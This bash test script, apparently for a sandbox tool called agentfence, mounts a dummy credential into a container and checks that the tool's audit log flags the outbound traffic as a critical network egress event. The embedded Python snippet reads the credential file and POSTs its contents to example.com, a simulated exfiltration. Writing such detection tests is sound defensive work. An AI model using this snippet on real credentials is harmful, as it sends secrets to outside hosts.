#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOG_DIR="$(mktemp -d)"
TMP_DIR="$(mktemp -d)"
trap 'rm -rf "$LOG_DIR" "$TMP_DIR"' EXIT

chmod 777 "$LOG_DIR"
printf 'network-secret\n' > "$TMP_DIR/demo.key"

cd "$ROOT_DIR"

echo "[test-network] building image"
cargo run -- build-image >/dev/null

echo "[test-network] triggering outbound connection with credential context"
cargo run -- run \
  --project "$ROOT_DIR" \
  --mount-cred "$TMP_DIR/demo.key" \
  --logs-dir "$LOG_DIR" \
  --name agentfence-network-test \
  -- \
  /bin/bash -lc \
  'sleep 1; python3 - /agentfence/creds/demo.key <<'"'"'PY'"'"'
import socket
import sys
import time

credential_path = sys.argv[1]
with open(credential_path, "rb") as handle:
    payload = handle.read()

sock = socket.create_connection(("example.com", 80), timeout=5)
sock.sendall(
    b"POST / HTTP/1.1\r\n"
    b"Host: example.com\r\n"
    + b"Content-Length: "
    + str(len(payload)).encode("ascii")
    + b"\r\nConnection: keep-alive\r\n\r\n"
    + payload
)
time.sleep(2)
sock.close()
PY
sleep 1'

echo "[test-network] registry output"
cat "$LOG_DIR/registry.json"
echo "[test-network] audit output"
cat "$LOG_DIR/audit.jsonl"

grep -q '"event":"network_egress"' "$LOG_DIR/audit.jsonl"
grep -q '"destination_port":"80"' "$LOG_DIR/audit.jsonl"
grep -q '"matched_registry_ids":"file::/agentfence/creds/demo.key"' "$LOG_DIR/audit.jsonl"
grep -q '"severity":"critical"' "$LOG_DIR/audit.jsonl"
grep -q '"process_name":"python3"' "$LOG_DIR/audit.jsonl"
grep -q '"expected_destinations"' "$LOG_DIR/registry.json"

echo "[test-network] PASS"
